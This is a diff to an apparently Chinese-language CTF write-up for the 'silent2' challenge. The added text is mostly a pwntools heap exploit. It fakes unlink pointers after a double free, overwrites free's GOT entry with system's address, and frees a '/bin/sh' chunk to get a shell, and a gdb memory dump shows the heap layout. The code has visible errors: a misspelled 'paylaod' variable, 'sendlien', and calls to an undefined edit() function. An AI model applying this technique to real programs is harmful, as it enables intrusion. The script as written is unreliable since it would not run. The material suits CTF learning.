@@ -60,5 +60,69 @@ free依然没有把指针清空。
 
 double free达到地址任意写，修改free_got为system地址
 
+```
+add(0x90,'a'*0x80)
+add(0x90,'b'*0x80)
+add(0x90,'/bin/sh')
+add(0x90,'c'*0x80)
+add(0x90,'d'*0x80)
+free(4)
+free(3)
+paylaod = p64(0)+p64(0x90)+p64(p_addr-0x18)+p64(p_addr-0x10)+'x'*0x70
+payload += p64(0x90)+p64(0xa0)
+add(0x130,payload)
+free(4)
+```
+```
+0x602080 <stdout>:	0x00007fc0d53d0620	0x0000000000000000
+0x602090 <stdin>:	0x00007fc0d53cf8e0	0x0000000000000000
+0x6020a0 <stderr>:	0x00007fc0d53d0540	0x0000000000000000
+0x6020b0:	0x0000000000000000	0x0000000000000000
+0x6020c0:	0x0000000000dca010	0x0000000000dca0b0
+0x6020d0:	0x0000000000dca150	0x0000000000dca1f0
+0x6020e0:	0x0000000000dca290	0x0000000000000000
 
+```
 
+exp
+```
+from pwn import *
+
+r = process("./silent2")
+print util.proc.pidof(r)
+
+def add(size,content):
+	r.sendline("1")
+	r.sendline(str(size))
+	r.sendline(content)
+
+def free(idx):
+	r.sendline("2")
+	r.sendline(str(idx))
+
+def update(idx,content):
+	r.sendline("3")
+	r.sendline(str(idx))
+	r.sendlien(content)
+
+sys_addr = 0x400730
+free_got = 0x602018
+p_addr = 0x6020d8
+add(0x90,'a'*0x80)
+add(0x90,'b'*0x80)
+add(0x90,'/bin/sh')
+add(0x90,'c'*0x80)
+add(0x90,'d'*0x80)
+free(4)
+free(3)
+payload = p64(0)+p64(0x90)+p64(p_addr-0x18)+p64(p_addr-0x10)+'x'*0x70
+payload += p64(0x90)+p64(0xa0)
+add(0x130,payload)
+free(4)
+pause()
+edit(3,p64(free_got))
+edit(0,p64(sys_addr))
+free(2)
+r.interactive()
+
+```
